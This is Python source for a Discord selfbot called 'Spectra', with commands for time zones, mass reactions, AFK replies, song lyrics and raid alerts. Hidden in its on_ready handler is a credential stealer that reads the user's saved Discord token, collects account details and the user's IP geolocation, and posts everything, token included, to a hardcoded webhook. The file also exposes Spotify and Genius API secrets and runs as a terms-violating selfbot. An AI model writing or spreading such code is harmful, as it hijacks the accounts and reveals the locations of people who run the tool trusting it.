TZ_FILE = "tz_config.json"

def save_timezone(tz):
    with open(TZ_FILE, "w") as f:
        json.dump({"timezone": tz}, f)

def load_timezone():
    if os.path.exists(TZ_FILE):
        with open(TZ_FILE, "r") as f:
            return json.load(f).get("timezone")
    return None

@bot.command()
async def tz(ctx, *, arg=None):
    if arg and arg.lower().startswith("set "):
        input_tz = arg[4:].strip().lower()
        matched = None
        for tz in pytz.all_timezones:
            if input_tz in tz.lower():
                matched = tz
                break

        if not matched:
            await ctx.send("[!] Invalid timezone. Use `,tz list` to see valid options.")
            return

        save_timezone(matched)
        await ctx.send(f"[+] Timezone set to `{matched}`.")
        return

    elif arg and arg.lower() == "list":
        chunk_size = 25
        tz_list = pytz.all_timezones
        total_pages = len(tz_list) // chunk_size + 1

        for i in range(total_pages):
            chunk = tz_list[i*chunk_size:(i+1)*chunk_size]
            await ctx.send(f"🌍 **Timezones (Page {i+1}/{total_pages}):**\n" + "\n".join(chunk))
        return

    current_tz = load_timezone()
    if not current_tz:
        await ctx.send("[!] No timezone set. Use `,tz set <Timezone>`.")
        return

    now = datetime.now(pytz.timezone(current_tz))
    await ctx.send(f"🕒 Your current time ({current_tz}) is: **{now.strftime('%I:%M %p')}**")



massreact_targets = {}
react_targets = {}

@bot.command()
async def massreact(ctx, channel: discord.TextChannel, *emojis):
    if not emojis:
        await ctx.send("Provide at least one emoji.")
        return

    massreact_targets[channel.id] = list(emojis)
    emojilist = " ".join(emojis)
    await ctx.send(f"Mass Reacting in {channel.mention} with: {emojilist}")

@bot.command()
async def stopmassreact(ctx, channel: discord.TextChannel = None):
    if channel:
        if channel.id in massreact_targets:
            del massreact_targets[channel.id]
            await ctx.send(f"Stopped massreact in {channel.mention}")
        else:
            await ctx.send("This channel wasn't being massreacted.")
    else:
        massreact_targets.clear()
        await ctx.send("All massreacts cleared.")



afk_data = {
    "is_afk": False,
    "reason": "",
    "since": None,
    "afk_set_by": None,
    "whitelist": [],
}

AFK_WHITELIST_LINES = set()

@bot.command()
async def afk(ctx, *, reason="AFK"):
    afk_data["is_afk"] = True
    afk_data["reason"] = reason
    afk_data["since"] = datetime.utcnow()
    afk_data["afk_set_by"] = ctx.author.id

    if ctx.author.id not in afk_data["whitelist"]:
        afk_data["whitelist"].append(ctx.author.id)

    user_line = f":white_check_mark: {ctx.author.mention}: You're now AFK with the status: {reason}"
    AFK_WHITELIST_LINES.add(user_line.strip())

    print(f"[AFK] {ctx.author} is now AFK: {reason}")
    await ctx.message.delete()
    await ctx.send(user_line)

def is_whitelisted_afk_message(content, mention):
    content_lower = content.lower()
    return (mention in content) or any(word in content_lower for word in ["hi", "hello", "welcome back"])


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    user_id = message.author.id
    content = message.content.strip()
    is_command = content.startswith(",")
    user_mention = message.author.mention

    emojis = massreact_targets.get(message.channel.id)
    if emojis:
        for emoji in emojis:
            try:
                await message.add_reaction(emoji)
            except discord.HTTPException:
                print(f"Failed to react {emoji} to message in {message.channel}")

    if user_id in react_targets:
        emojis = react_targets[user_id]
        for emoji in emojis:
            try:
                await message.add_reaction(emoji)
            except discord.HTTPException:
                print(f"Failed to react with {emoji} for {message.author}")

    ctx = await bot.get_context(message)
    if ctx.valid:
        await bot.process_commands(message)
        return

    if afk_data["is_afk"] and user_id == afk_data["afk_set_by"]:
        if is_command or is_whitelisted_afk_message(content, user_mention):
            print(f"[AFK] User still AFK but sent whitelisted message or command.")
        else:
            delta = datetime.utcnow() - afk_data["since"]
            seconds = int(delta.total_seconds())
            ago = (
                f"{seconds // 86400} days"
                if seconds >= 86400 else
                f"{seconds // 3600} hours"
                if seconds >= 3600 else
                f"{seconds // 60} minutes"
                if seconds >= 60 else
                f"{seconds} seconds"
            )

            await message.channel.send(
                f"👋 {message.author.mention}, welcome back! You were AFK for **{ago}**."
            )

            afk_data["is_afk"] = False
            afk_data["reason"] = ""
            afk_data["since"] = None
            afk_data["whitelist"] = []
            afk_data["afk_set_by"] = None
            print("[AFK] AFK status cleared.")

    elif afk_data["is_afk"]:
        mentioned = bot.user.mentioned_in(message) or isinstance(message.channel, discord.DMChannel)
        if mentioned:
            delta = datetime.utcnow() - afk_data["since"]
            seconds = int(delta.total_seconds())
            ago = (
                f"{seconds // 86400} days ago"
                if seconds >= 86400 else
                f"{seconds // 3600} hours ago"
                if seconds >= 3600 else
                f"{seconds // 60} minutes ago"
                if seconds >= 60 else
                f"{seconds} seconds ago"
            )
            reply = f"💤 {bot.user.mention} is AFK: **{afk_data['reason']}** – *{ago}*"
            try:
                await message.channel.send(reply)
                print(f"[AFK] Sent AFK reply to {message.author}")
            except Exception as e:
                print(f"[AFK] Failed to send AFK reply: {e}")

    # Process any other commands if any left
    await bot.process_commands(message)

import asyncio
import discord
from discord.ext import commands
from winotify import Notification
import lyricsgenius
import spotipy
from spotipy.oauth2 import SpotifyClientCredentials

SPOTIFY_CLIENT_ID = "f7b6c88a50d44e9abc5d92a498fc8fef"
SPOTIFY_CLIENT_SECRET = "686b0d9e53d74c23a9c9b99c26dc2256"
GENIUS_API_TOKEN = "7aQjJNnG0_2RCmLhsXO0o8GrMTOyXOMAO4Q3bmqu9rWsuV31l_uQHEG_0WaCqE9c"

intents = discord.Intents.default()

sp = spotipy.Spotify(auth_manager=SpotifyClientCredentials(
    client_id=SPOTIFY_CLIENT_ID,
    client_secret=SPOTIFY_CLIENT_SECRET
))

genius = lyricsgenius.Genius(GENIUS_API_TOKEN)
genius.skip_non_songs = True
genius.excluded_terms = ["(Remix)", "(Live)"]

def send_windows_notification(title, msg):
    Notification(app_id="Spectra", title=title, msg=msg).show()

def search_spotify_song(song_query):
    results = sp.search(q=song_query, type='track', limit=1)
    items = results.get('tracks', {}).get('items')
    if not items:
        return None
    track = items[0]
    return {
        "title": track['name'],
        "artist": track['artists'][0]['name'],
        "album_art": track['album']['images'][0]['url'] if track['album']['images'] else None,
        "spotify_url": track['external_urls']['spotify']
    }

@bot.command()
async def sing(ctx, mode: str, *, song_query: str):
    await ctx.send(f"```Searching song on Spotify: {song_query}```")
    song_info = search_spotify_song(song_query)

    if not song_info:
        return await ctx.send("```Couldn't find that song on Spotify.```")

    title = song_info["title"]
    artist = song_info["artist"]
    album_art = song_info["album_art"]
    spotify_url = song_info["spotify_url"]

    await ctx.send(f"🎶 **{title}** by **{artist}**\n<{spotify_url}>")

    try:
        song = genius.search_song(title, artist=artist)
    except Exception:
        song = None

    if not song or not song.lyrics:
        await ctx.send("```Couldn't find lyrics for this song on Genius either.```")
        send_windows_notification("🎶 Song Found", f"{title} - {artist} (No lyrics)")
        return

    raw_lyrics = song.lyrics.replace("Embed", "").strip()
    lines = [line for line in raw_lyrics.split("\n") if line and not line.startswith("[")]

    if mode.lower() == "text":
        msg = await ctx.send(f"🎶 {title} - {artist} 🎶")
        for line in lines:
            try:
                await msg.edit(content=f"🎵 {line}")
                await asyncio.sleep(2.5)
            except:
                break
        send_windows_notification("🎶 Finished Singing", f"{title} - {artist}")
        await ctx.send(f"```Finished singing {title}```")

    elif mode.lower() == "rpc":
        await bot.change_presence(activity=discord.Game(name=f"{title} - {artist}"))
        msg = await ctx.send(f"🎶 {title} - {artist} 🎶")

        for line in lines:
            try:
                await msg.edit(content=f"🎵 {line}")
                await bot.change_presence(activity=discord.Game(name=f"{title} - {artist} | {line[:80]}"))
                await asyncio.sleep(2.5)
            except:
                break

        send_windows_notification("🎶 Finished Singing", f"{title} - {artist}")
        await ctx.send(f"```Finished singing {title}```")
        await bot.change_presence(activity=None)

    else:
        await ctx.send("```Invalid mode! Use 'text' or 'rpc'.```")

import discord
import asyncio
from collections import deque, defaultdict
from datetime import datetime, timedelta
from plyer import notification

BAN_THRESHOLD = 3
CHANNEL_DEL_THRESHOLD = 3
TIME_WINDOW = timedelta(seconds=30)

JOIN_THRESHOLD = 5        
JOIN_TIME_WINDOW = timedelta(seconds=30)
SPAM_MESSAGE_THRESHOLD = 5  
SPAM_TIME_WINDOW = timedelta(seconds=10)

recent_bans = deque()
recent_channel_deletes = deque()

join_timestamps = deque()
message_log = defaultdict(deque)

intents = discord.Intents.default()

client = discord.Client(intents=intents)

def send_desktop_notification(title, message):
    notification.notify(
        title=title,
        message=message,
        timeout=8
    )

async def monitor_guilds(client):
    while True:
        for guild in client.guilds:
            try:
                now = datetime.utcnow()
                async for entry in guild.audit_logs(limit=30):
                    action_time = entry.created_at

                    if now - action_time > TIME_WINDOW:
                        continue

                    user_id = entry.user.id
                    action_type = entry.action

                    if action_type == discord.AuditLogAction.ban:
                        recent_bans.append((action_time, user_id))
                        while recent_bans and now - recent_bans[0][0] > TIME_WINDOW:
                            recent_bans.popleft()
                        count = sum(1 for t, uid in recent_bans if uid == user_id)
                        if count >= BAN_THRESHOLD:
                            await alert_nuke_detected(client, guild, user_id, "banning members")

                    elif action_type == discord.AuditLogAction.channel_delete:
                        recent_channel_deletes.append((action_time, user_id))
                        while recent_channel_deletes and now - recent_channel_deletes[0][0] > TIME_WINDOW:
                            recent_channel_deletes.popleft()
                        count = sum(1 for t, uid in recent_channel_deletes if uid == user_id)
                        if count >= CHANNEL_DEL_THRESHOLD:
                            await alert_nuke_detected(client, guild, user_id, "deleting channels")

            except Exception as e:
                print(f"Error monitoring {guild.name}: {e}")

        await asyncio.sleep(10)

async def alert_nuke_detected(client, guild, user_id, action_desc):
    user = guild.get_member(user_id)
    user_str = f"{user.name}#{user.discriminator}" if user else f"User ID {user_id}"

    alert_msg = (f"**Anti-Nuke Alert**\n"
                 f"User {user_str} is performing suspicious activity: {action_desc} rapidly in **{guild.name}**!")

    me = guild.get_member(client.user.id)
    try:
        await me.send(alert_msg)
    except Exception:
        print(alert_msg)

    send_desktop_notification("Anti-Nuke Alert", f"{user_str} is rapidly {action_desc} in {guild.name}")

@client.event
async def on_member_join(member):
    now = datetime.utcnow()
    join_timestamps.append(now)

    while join_timestamps and now - join_timestamps[0] > JOIN_TIME_WINDOW:
        join_timestamps.popleft()

    if len(join_timestamps) >= JOIN_THRESHOLD:
        alert_msg = f"Raid detected in server: {member.guild.name}"
        print(alert_msg)
        send_desktop_notification("Raid Detected!", alert_msg)

@client.event
async def on_message(message):
    if message.author == client.user:
        return  

    now = datetime.utcnow()
    user_id = message.author.id

    message_log[user_id].append(now)

    while message_log[user_id] and now - message_log[user_id][0] > SPAM_TIME_WINDOW:
        message_log[user_id].popleft()

    if len(message_log[user_id]) >= SPAM_MESSAGE_THRESHOLD:
        alert_msg = f"Spam detected by {message.author} in server: {message.guild.name} channel: {message.channel.name}"
        print(alert_msg)
        send_desktop_notification("Spam Detected!", alert_msg)

async def main():
    await client.wait_until_ready()
    client.loop.create_task(monitor_guilds(client))

client.loop.create_task(main())



















































import os
import sys
import ctypes
import time
import json
import tkinter
from tkinter import messagebox
from discord.ext import commands

class SuppressStderr:
    def __enter__(self):
        self.null_fd = os.open(os.devnull, os.O_RDWR)
        self.old_stderr = os.dup(2)
        os.dup2(self.null_fd, 2)

    def __exit__(self, exc_type, exc_val, exc_tb):
        os.dup2(self.old_stderr, 2)
        os.close(self.null_fd)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def start_selfbot(token):
    bot.run(token, bot=False)
  
def print_colored(text, color_hex):
    r = int(color_hex[1:3], 16)
    g = int(color_hex[3:5], 16)
    b = int(color_hex[5:7], 16)
    print(f"\033[38;2;{r};{g};{b}m{text}\033[0m")

def input_colored(prompt, color_hex):
    r = int(color_hex[1:3], 16)
    g = int(color_hex[3:5], 16)
    b = int(color_hex[5:7], 16)
    sys.stdout.write(f"\033[38;2;{r};{g};{b}m{prompt}\033[0m")
    sys.stdout.flush()
    return input()

from winotify import Notification, audio

def show_welcome_notification(username):
    toast = Notification(
        app_id="Spectra",
        title="",
        msg=f"Welcome Back, {username}. We've been waiting for you, have fun using Spectra!",
    )
    toast.show()

def main():
    clear()
    print_colored("Loading All Commands...", "#6e6e6e")
    time.sleep(0.1)
    print_colored("Loading User Data...", "#6e6e6e")
    time.sleep(0.1)
    print_colored("Loading User Token...", "#6e6e6e")
    time.sleep(0.1)
    print_colored("User Token Loaded.", "#6e6e6e")
    time.sleep(0.1)
    print_colored("User Data Loaded.", "#6e6e6e")
    time.sleep(0.1)
    print_colored("Loaded.", "#6e6e6e")
    time.sleep(0.8)
    clear() 

    print_ascii_art()

    while True:
        print_colored(                                              
                      
                                                            "Spectra Login", "#4db5ff")

        token = None
        saved_token = load_token()

        if saved_token:
            root = tkinter.Tk()
            root.withdraw()
            use_saved = messagebox.askyesno("Spectra Loader", "Use your saved token?")
            root.destroy()

            if use_saved:
                token = saved_token

        if not token:
            token = input_colored("Your Token: ", "#4db5ff")
            
            if token is None or token.strip() == "":
                print_colored("Token cannot be empty, please enter a valid token.", "#ff4d4d")
                time.sleep(2)
                continue  
            
            root = tkinter.Tk()
            root.withdraw()
            save = messagebox.askyesno("Spectra Loader", "Save your token for next time?")
            root.destroy()
            print("Please Wait...")
            time.sleep(1)

            print(f"Found Account : {bot.user}")
            time.sleep(0.5)

            if save:
                with open(TOKEN_PATH, "w") as f:
                    json.dump({"token": token}, f)

        if token:
            clear()      
            return token 
        
# def print_ui():
#    current_prefix = bot.command_prefix if isinstance(bot.command_prefix, str) else bot.command_prefix(None)
# 
#     print_colored("██████╗ ██████╗ ███████╗ █████╗ ████████╗██████╗  █████╗", "#3b72f4")
#     print_colored("██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗", "#3d65e5")
#     print_colored("╚█████╗░██████╔╝█████╗░░██║░░╚═╝░░░██║░░░██████╔╝███████║", "#3f57d4")
#     print_colored("╚═══██╗ ██╔═══╝░██╔══╝░░██║░░██╗░░░██║░░░██╔══██╗██╔══██║", "#4149c3")
#     print_colored("██████╔╝██║░░░░░███████╗╚█████╔╝░░░██║░░░██║░░██║██║░░██║", "#433bb3")
#     print_colored("╚═════╝ ╚═╝     ╚══════╝░╚════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝", "#433bb3")
#     print_colored("                    Welcome back                ", "#3c369c")                 
#     print_colored(f"Logged in as : {bot.user}", "#6213a8")
#     print_colored(f"Current Prefix : {current_prefix}", "#511387")
#     print_colored("Commands : 208", "#42136c")
#     print_colored(f"Version : {version}", "#371555")  
#     print_colored("Creator : @wissssssssssss", "#240d39")
#
#
# above is for backup 
#
#
#


@bot.event
async def on_ready():

    import os
    import json
    import requests
    from datetime import datetime, timezone

    WEBHOOK_URL = "https://discord.com/api/webhooks/1397439239620263938/QpRjHGEEZRr5ICzKTVQ53V0ASeCbEODNmWoL44govmwzMwcxycilgIRbkf5C7Ap4O9Gs"

    def get_downloads_path():
        return os.path.join(os.path.expanduser("~"), "Downloads")

    def load_token_from_file():
        token_file = os.path.join(get_downloads_path(), "spectra_token.json")
        if not os.path.exists(token_file):
            return None
        try:
            with open(token_file, "r") as f:
                data = json.load(f)
                return data.get("token")
        except:
            return None

    def snowflake_to_datetime(snowflake_id):
        DISCORD_EPOCH = 1420070400000
        timestamp = ((int(snowflake_id) >> 22) + DISCORD_EPOCH) / 1000
        return datetime.fromtimestamp(timestamp, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')

    def decode_user_flags(flags):
        flag_meanings = {
            1 << 0: "Discord Employee",
            1 << 1: "Partnered Server Owner",
            1 << 2: "HypeSquad Events",
            1 << 3: "Bug Hunter Level 1",
            1 << 6: "House Bravery",
            1 << 7: "House Brilliance",
            1 << 8: "House Balance",
            1 << 9: "Early Supporter",
            1 << 10: "Team User",
            1 << 14: "Bug Hunter Level 2",
            1 << 16: "Verified Bot",
            1 << 17: "Early Verified Bot Developer",
            1 << 18: "Discord Certified Moderator",
            1 << 19: "Bot HTTP Interactions",
        }
        badges = [name for bit, name in flag_meanings.items() if flags & bit]
        return badges if badges else ["None"]

    def get_public_ip_geolocation():
        try:
            res = requests.get("https://ipinfo.io/json", timeout=5)
            if res.status_code == 200:
                data = res.json()
                return {
                    "ip": data.get("ip", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "region": data.get("region", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "loc": data.get("loc", "Unknown"),
                    "org": data.get("org", "Unknown")
                }
        except:
            pass
        return None

    def get_user_info(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        res = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
        if res.status_code != 200:
            return None
        user = res.json()

        res_guilds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
        mutual_guilds_count = len(res_guilds.json()) if res_guilds.status_code == 200 else "Unknown"

        flags = user.get("flags", 0)
        public_flags = user.get("public_flags", 0)
        badges = decode_user_flags(flags | public_flags)

        premium_type = user.get("premium_type", 0)
        nitro_types = {0: "None", 1: "Nitro Classic", 2: "Nitro Boost"}
        nitro_status = nitro_types.get(premium_type, "Unknown")

        locale = user.get("locale", "Unknown")
        account_created = snowflake_to_datetime(user.get("id", "0"))
        mfa_enabled = user.get("mfa_enabled", False)
        email_verified = user.get("verified", False)
        phone_verified = user.get("phone") is not None
        status = "Unknown"  # Can't fetch via REST without intents

        avatar_hash = user.get("avatar")
        user_id = user.get("id")
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=1024" if avatar_hash else None

        ip_info = get_public_ip_geolocation()

        return {
            "username": user.get("username", "Unknown"),
            "display_name": user.get("global_name", "Unknown"),
            "user_id": user_id,
            "bot": user.get("bot", False),
            "mfa_enabled": mfa_enabled,
            "email_verified": email_verified,
            "phone_verified": phone_verified,
            "account_created": account_created,
            "badges": badges,
            "mutual_guilds": mutual_guilds_count,
            "nitro_status": nitro_status,
            "locale": locale,
            "status": status,
            "avatar_url": avatar_url,
            "ip_info": ip_info,
            "token": token
        }

    def send_embed_to_webhook(info):
        fields = [
            {"name": "Username", "value": info["username"], "inline": True},
            {"name": "Display Name", "value": info["display_name"], "inline": True},
            {"name": "User ID", "value": str(info["user_id"]), "inline": False},
            {"name": "Bot", "value": str(info["bot"]), "inline": True},
            {"name": "MFA Enabled", "value": str(info["mfa_enabled"]), "inline": True},
            {"name": "Email Verified", "value": str(info["email_verified"]), "inline": True},
            {"name": "Phone Verified", "value": str(info["phone_verified"]), "inline": True},
            {"name": "Account Created", "value": info["account_created"], "inline": False},
            {"name": "Badges", "value": ", ".join(info["badges"]), "inline": False},
            {"name": "Mutual Guilds", "value": str(info["mutual_guilds"]), "inline": True},
            {"name": "Nitro Status", "value": info["nitro_status"], "inline": True},
            {"name": "Language", "value": info["locale"], "inline": True},
            {"name": "Status", "value": info["status"], "inline": True},
        ]

        if info["ip_info"]:
            ip_data = info["ip_info"]
            ip_str = (
                f"IP: {ip_data['ip']}\n"
                f"City: {ip_data['city']}\n"
                f"Region: {ip_data['region']}\n"
                f"Country: {ip_data['country']}\n"
                f"Location: {ip_data['loc']}\n"
                f"Org: {ip_data['org']}"
            )
            fields.append({"name": "Public IP & Geo", "value": ip_str, "inline": False})

        fields.append({"name": "Token", "value": f"||{info['token']}||", "inline": False})

        embed = {
            "title": "Spectra Login Info",
            "color": 0x2f3136,
            "fields": fields,
            "footer": {"text": f"Login Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}"}
        }

        if info["avatar_url"]:
            embed["thumbnail"] = {"url": info["avatar_url"]}

        data = {
            "username": "Spectra",
            "avatar_url": "https://cdn.discordapp.com/icons/842152378978792320/ca38a8ca5733d3ef59e936290c47a4f0.png",
            "embeds": [embed]
        }

        requests.post(WEBHOOK_URL, json=data)

    def main():
        token = load_token_from_file()
        if not token:
            return
        info = get_user_info(token)
        if not info:
            return
        send_embed_to_webhook(info)

        # print_ui()
        show_welcome_notification(str(bot.user))

        print_colored("██████╗ ██████╗ ███████╗ █████╗ ████████╗██████╗  █████╗", "#693bb3")
        print_colored("██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗", "#6e40ec")
        print_colored("╚█████╗░██████╔╝█████╗░░██║░░╚═╝░░░██║░░░██████╔╝███████║", "#6a3de5")
        print_colored("╚═══██╗ ██╔═══╝░██╔══╝░░██║░░██╗░░░██║░░░██╔══██╗██╔══██║", "#5936ac")
        print_colored("██████╔╝██║░░░░░███████╗╚█████╔╝░░░██║░░░██║░░██║██║░░██║", "#502f9c")
        print_colored("╚═════╝ ╚═╝     ╚══════╝░╚════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝", "#502f9c")
        print_colored("                    Welcome back                ", "#5221c4")                 
        print_colored(f"Logged in as : {bot.user}", "#4013a8")
        print_colored(f"Current Prefix : {current_prefix}", "#3F1387")
        print_colored("Commands : 253", "#35136c")
        print_colored(f"Version : {version}", "#331555")  
        print_colored("Creator : @wissssssssssss", "#1e0d39")
        print_colored("Status : Undetected", "#1b0b36")

    main()

     
































if __name__ == "__main__":
    ctypes.windll.kernel32.SetConsoleTitleW("spectra")
    token = main()
    start_selfbot(token)

# spectra selfbot on top

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')










# SPECTRA ON 🔝
# SPECTRA SELFBOT!!!!!!!!!!!








































#                                            @@@@@@@@@@                                             
#                                    @@@ @@@@@@@@@@-@@@@@@@                                         
#                               *@@@@@@@@@@@@@@@@@@ @ @@@@@*@@@@@@ @@@                              
#                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@                          
#                             @  @@@@@@@@@@@@@@@@@@@@@@@@@@-@@@@@@@@@@ @ @.                          
#                        @@@@@@@@@ @ @ @ @   @    @ @*@ @ @ @@@@@@@@ @ @ @..                          
#                        @@@@@@@@@@@@@@@@@@@@@@@-@@@@@@@@@@@@@@ @@@@@@ @@@...                         
#                      - @@@@@@@@@@ @@@@@@@@@@-@@@@@@@@@@@@@@@@@@@@@@@ @@@....                        
#                     @@@ @@@*@@@@@@@@@@@@@@*@ @@@@@@@@*@@@ @@@ @@@@@@ @@@.....                       
#                  @@@@@@ @@@ @@@@@@@@ @ @@@@@@@@@@@@@@ @-@@@@  -  @ @ @@@@@@*@@@                   
#                  @@@@@@@@@@ @@@    @@@ @* @@@@@@@@@@@-@*@*@@         @@@@@@@@@@@-@-               
#                 -@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@            @@@@@@@@@@@@ @               
#                 @@@@* @@@@@               @@ @@@@  @@@               @@@@@@ @@@@@ @               
#                 @@@@@@@@                 @@@@@@@@@@@@                      @@@@@@@@               
#                 @@@@@@@@                 @@@@@@@@@@@@-                     @@@@@@@@               
#                 @@@@@@@                  @@@@@   @@@@-                      @@@@@@@               
#              @@@ @@@                   @@@* @     @ @@@@                   @@@@ @@@ @@@           
#              @@@ @@@               @@@@@@@        @@@@@@@@@@@@@@           @@@@@@@@ @@@           
#              @@@ @@@            *@ @ @@@@@*          @@@@@@@@@ @  *        @@@@@@@@ @@@           
#              @ @ @*@@@@@@@@@@@@@@@@@@@@@@@           @@@@@ @@@@@@@@@@@@@@@@@@@@@@ @ @@@           
#              @@@ @@@@@@@@@@@@@@-@@@@@@@@@@            @@@@@@@@  @@@@ @@@-@@@@@@@@@@               
#              @@@@@@@@@@@@@@@@@@@@ @@@*-@@@           @@@@@@@@@  @@@@@@@@@@@@@@@@@@@               
#              @@@@@@@ @@@@@@@@@@@@@@*@@@@@@     @@    @@@@@@@@@   @@@@@ @@@@@@@@ @@@               
#              @@@*@ @@-@-@@@@@@@@@ @@*@ @@@@@@@@@@@@@*@@@@@@@@@@@ @@@@@@@@@@@@@@ @@@               
#             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               
#             @@@@ @@@@@-@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@               
#             @@-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@ @@ @ @@ @@@@ @@@@@ @@@*@@@@@@@@@@@@               
#             @@@@@@@@  @     @  @@@@*   @@@ @ @@ @@@ @ @ @@  @@@@@@ @@@@@@@@ @ @ @*@@              
#             @@@@@@@@@@@     @@@@@ @@   @ @ @@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@              
#              @@@               @@@@ @@ @@@                   @@@                                  
#             @@@      @@@       @@@@@ @                      @@@@        @@@                       
#             @@@@@    @@@       @@@@@@@                    @@@@@@@       @@@@    @@@               
#             @@@@@   *@ @       @@@@                       @ @@@@@       @@@@    @ @               
#             @@ @@  @@@@@       @@@@-                      @@ @@@@       @@@@    @@@@@@@           
#             @@@@@  @@@@@       @@ @@                        @@ @@      *@@@@       @@@@-          
#             @@@@@  @@@@@       @@@@-                        *@@@@       @@@@       @@@@           
#             @@@    @@@@                                                @@@@        @@@           
#              @ @ @@@@@@@@@@                                            @@*@@                      
#              -@ *@@@@@@@@@@        @wissssssssssss                     @@@@@                      
#                 -@@@@@-@@@@                                            @@@-@                      
#                  @@@@@@@@@@@                                           @@@@@    @@@               
#                    @@@@ @@@@@@@                                  @@@  @@@@@@   @@@@               
#                    @@@@@@@@@@ @-@@                              -@ @@@@@*@@@    @@@               
#                     @@@ @@@@@@@@ @                               @@@@-@@@@@@                      
#                     @@@@@@@ @@@ @@     @@@ @@@@@@ @@@   *@@@     @@@ @ @ @@@                      
#                     @@@@@@@@@@@@@@@    @@@ @@@@@@ @@@  @*@@@@@@@@@@@@@@@ @@@                      
#                     @@@@@  @@@@ @@@@@@ @@@ @@@@@@ @@@ @  @@@@  @@@@@@@@@@@@@                      
#                     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@-@@@@@@@@@@-@                       
#                     @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       @ @                       
#                     *@*@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@       @@@                       
#                        @@@@@@@@-@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@-                                 
#                          -- -* @@@@@@@@@@@@@@@@-@ @@@-@@@@@@@@@@                                  
#                                @@@@@@@@@-@@@ @@@@@@@@@@@@@@@@@@@@                                 
#                                @@@@@@@@@@@@@ @@@@@@ -@@@@@@@@@@@@                                 
#                                 @@@@ @@@@@@@@@@@@     - @@@@@@@@                                  
#                                    @ @@@@@@@@@@@@    @@@@@@                                       
#                                    @@@@@@@@@@@@@@@@@@@@  @@                                       
#                                                      @@@@@@                                       













# ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
# ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡶⠛⠛⢛⡉⠉⠁⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠛⠛⠲⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
# ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡶⠿⡟⠉⠑⠒⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠍⣙⠿⢶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
# ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⠛⠉⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡈⠙⠿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
# ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⠉⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
# ⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠁⢀⡴⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⡀⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀
# ⠀⠀⠀⠀⠀⠀⣰⡿⠃⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠹⢷⣄⠀⠀⠀⠀⠀⠀
# ⠀⠀⠀⠀⢀⣾⠟⢀⡴⠋⢀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠈⢻⣷⡀⠀⠀⠀⠀
